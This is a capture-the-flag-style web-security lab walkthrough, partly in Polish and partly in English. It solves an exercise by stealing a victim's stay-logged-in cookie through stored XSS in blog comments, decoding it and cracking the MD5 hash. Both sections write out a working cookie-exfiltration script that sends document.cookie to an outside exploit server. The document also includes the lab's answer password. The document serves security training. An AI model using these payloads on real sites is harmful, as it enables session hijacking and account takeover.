This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter
Victim's username: carlos



1. Wchodzimy w zadanie na stronie i uruchamiamy burpa. Na stronie klikamy my account, wpisujemy dane wiener oraz peter i zaznaczamy opcje stay logged in, logujemy się.
2. W burpie wchodzimy w http history i szukamy połączenia GET URL:/my account, wchodzimy w tego url i widzimy że stay logged in, ma szyfrowanie, odpalamy inspectora i widzimy, że szyfrowanie to base 64 encodowane, teraz kopiujemy zakodowane hasło z decoded from
3. Wchodzimy na strone crackstation, wklejamy tam zaszyfrowane hasło, klikamy crqack hashes, widziszmy, że hasło było zaszyfrowane w md5 i hasło to peter.
4. Wyylogowujemy się z konta, wchodzimy na stronie w jakiegoś bloga. W komentarzu sprawdzamy czy strona jest podatna na xxs. W komentarzu wpisujemy <img src=1 onerror=alert(1)/> i klikamy post comment, jeżeli pojawi nam się czarna ramka, to znaczy, że jest podatny.
5. Teraz wchodzimy w exploit server i kopiujemy adres https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
6. Wchodzimy w innego bloga i wpisujemy <script>document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script> klikamy post comment
7. Wchodzimy w exploit sever i klikamy acces log, szukamy innego ip i kopiujemy linijkę po stay-logged in, wchodzimy w burpie w dekodera, wklejamy tą linijkę, wybieramy decode as base64, otrzymujemy użytkownika carlosa i hasło w md5, kopiujemy hasło z md 5 i wchodzimy w crackstation
8. W crach station wklejamy hasło i klikamy crack hash, wychodzi nam typ oraz hasło w zadaniu jest to onceuponatime
9. Logujemy się na stronie carlos i wpisujemy hasło onceuponatime i usuwamy konto  









1.With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the stay-logged-in cookie is Base64 encoded.
2.In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows:
username+':'+md5HashOfPassword
3.You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4.Go to the exploit server and make a note of the URL.
5.Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
6.On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
7.Decode the cookie in Burp Decoder. The result will be:
carlos:26323c16d5f4dabff3bb136f2460a943
8.Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime.
9.Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.